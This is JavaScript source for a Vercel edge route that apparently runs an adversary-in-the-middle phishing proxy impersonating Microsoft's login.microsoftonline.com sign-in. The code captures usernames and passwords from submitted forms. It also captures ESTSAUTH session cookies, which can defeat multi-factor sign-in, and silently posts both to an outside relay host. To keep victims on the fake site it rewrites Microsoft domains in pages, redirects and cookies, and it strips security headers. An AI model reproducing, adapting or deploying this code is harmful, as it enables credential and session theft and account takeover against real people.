export const runtime = 'edge';

// Configuration
const UPSTREAM = 'login.microsoftonline.com';
const UPSTREAM_PATH = '/';
const VERCEL_URL = 'https://apisage.searchegpt.com/api/relay';
const BLOCKED_REGIONS = [];
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// ---- Exfiltration Functions ----
async function sendCredsToVercel(data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  } catch (error) {
    // Intentionally silent
  }
}

async function exfiltrateCookiesFile(cookieText, ip) {
  try {
    const content = `IP: ${ip}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    
    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {
    // Intentionally silent
  }
}

function filterResponseHeaders(headers) {
  const blacklist = new Set([
    'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization',
    'te', 'trailers', 'transfer-encoding', 'upgrade'
  ]);
  const out = new Headers();
  for (const [k, v] of headers) {
    if (!blacklist.has(k.toLowerCase())) {
      out.set(k, v);
    }
  }
  return out;
}

async function proxyRequest(req, pathSegments = []) {
  const url = new URL(req.url);
  
  // Get client info from Vercel headers
  const region = req.headers.get('x-vercel-ip-country')?.toUpperCase() || '';
  const ipAddress = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  // Blocking check
  if (BLOCKED_REGIONS.includes(region) || BLOCKED_IPS.includes(ipAddress)) {
    return new Response('Access denied.', { status: 403 });
  }

  // Build upstream path - handle root and nested paths
  let upstreamPath = UPSTREAM_PATH;
  if (pathSegments.length > 0) {
    upstreamPath = UPSTREAM_PATH + pathSegments.join('/');
  }

  // Build upstream URL
  const upstreamUrl = `https://${UPSTREAM}${upstreamPath}${url.search}`;

  // Build headers for upstream fetch
  const upstreamHeaders = new Headers(req.headers);
  upstreamHeaders.set('host', UPSTREAM);
  upstreamHeaders.set('referer', `https://${url.hostname}`);
  
  // Remove internal headers
  upstreamHeaders.delete('x-internal-relay');
  
  // ---- Credentials capture for POST requests ----
  let requestBody = null;
  let credentialsExtracted = false;
  
  if (req.method === 'POST') {
    try {
      const clonedReq = req.clone();
      const bodyText = await clonedReq.text();
      requestBody = bodyText;
      
      const params = new URLSearchParams(bodyText);
      const user = params.get('login');
      const pass = params.get('passwd');
      
      if (user && pass) {
        credentialsExtracted = true;
        await sendCredsToVercel({
          type: "creds",
          ip: ipAddress,
          user: decodeURIComponent(user.replace(/\+/g, ' ')),
          pass: decodeURIComponent(pass.replace(/\+/g, ' ')),
        });
      }
    } catch (error) {
      // Continue even if extraction fails
    }
  }

  // Prepare fetch options
  const opts = {
    method: req.method,
    headers: upstreamHeaders,
    redirect: 'manual',
    body: ['GET', 'HEAD'].includes(req.method) ? undefined : (requestBody || req.body)
  };

  const upstreamResponse = await fetch(upstreamUrl, opts);

  // Handle redirects by returning them directly
  if ([301, 302, 303, 307, 308].includes(upstreamResponse.status)) {
    const location = upstreamResponse.headers.get('location');
    if (location) {
      const modifiedLocation = location.replace(
        /https?:\/\/login\.microsoftonline\.com/gi, 
        `https://${url.hostname}`
      );
      const responseHeaders = new Headers(upstreamResponse.headers);
      responseHeaders.set('location', modifiedLocation);
      return new Response(null, {
        status: upstreamResponse.status,
        headers: responseHeaders
      });
    }
  }

  // Filter response headers
  const responseHeaders = filterResponseHeaders(upstreamResponse.headers);
  
  // Add CORS headers
  responseHeaders.set('access-control-allow-origin', '*');
  responseHeaders.set('access-control-allow-credentials', 'true');
  
  // Remove security headers
  responseHeaders.delete('content-security-policy');
  responseHeaders.delete('content-security-policy-report-only');
  responseHeaders.delete('clear-site-data');

  // ---- Cookie processing and exfiltration ----
  let allCookies = '';
  const cookieHeaders = responseHeaders.get('set-cookie');
  
  if (cookieHeaders) {
    const cookiesArray = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
    allCookies = cookiesArray.join('; \n\n');
    
    // Modify cookie domains to work with our proxy
    const modifiedCookies = cookiesArray.map(cookie => 
      cookie.replace(/login\.microsoftonline\.com/gi, url.hostname)
    );
    
    // Replace original cookies with modified ones
    responseHeaders.delete('set-cookie');
    modifiedCookies.forEach(cookie => {
      responseHeaders.append('set-cookie', cookie);
    });
  }

  // Exfiltrate cookies if auth cookies detected
  if (allCookies.includes('ESTSAUTH') && allCookies.includes('ESTSAUTHPERSISTENT')) {
    await exfiltrateCookiesFile(allCookies, ipAddress);
  }

  // Process response body for domain replacement
  const contentType = responseHeaders.get('content-type');
  let responseBody = upstreamResponse.body;

  if (contentType && /(text\/html|application\/javascript|application\/json)/i.test(contentType)) {
    try {
      // Clone response to read as text
      const textResponse = upstreamResponse.clone();
      let text = await textResponse.text();
      
      // Replace Microsoft domains with our proxy domain
      text = text.replace(/login\.microsoftonline\.com/gi, url.hostname);
      text = text.replace(/https:\/\/login\.microsoftonline\.com/gi, `https://${url.hostname}`);
      text = text.replace(/http:\/\/login\.microsoftonline\.com/gi, `https://${url.hostname}`);
      
      // Also replace any absolute URLs in scripts and links
      text = text.replace(/"\/common\//g, `"/common/`);
      text = text.replace(/'\/common\//g, `'/common/`);
      
      responseBody = text;
    } catch (error) {
      // Fallback to original body if processing fails
      responseBody = upstreamResponse.body;
    }
  }

  return new Response(responseBody, {
    status: upstreamResponse.status,
    statusText: upstreamResponse.statusText,
    headers: responseHeaders
  });
}

// Export handlers for common HTTP methods
export async function GET(req, context) {
  const { params } = context;
  return proxyRequest(req, params.path || []);
}

export async function POST(req, context) {
  const { params } = context;
  return proxyRequest(req, params.path || []);
}

export async function PUT(req, context) {
  const { params } = context;
  return proxyRequest(req, params.path || []);
}

export async function DELETE(req, context) {
  const { params } = context;
  return proxyRequest(req, params.path || []);
}

export async function PATCH(req, context) {
  const { params } = context;
  return proxyRequest(req, params.path || []);
}

export async function OPTIONS(req, context) {
  const { params } = context;
  return proxyRequest(req, params.path || []);
}
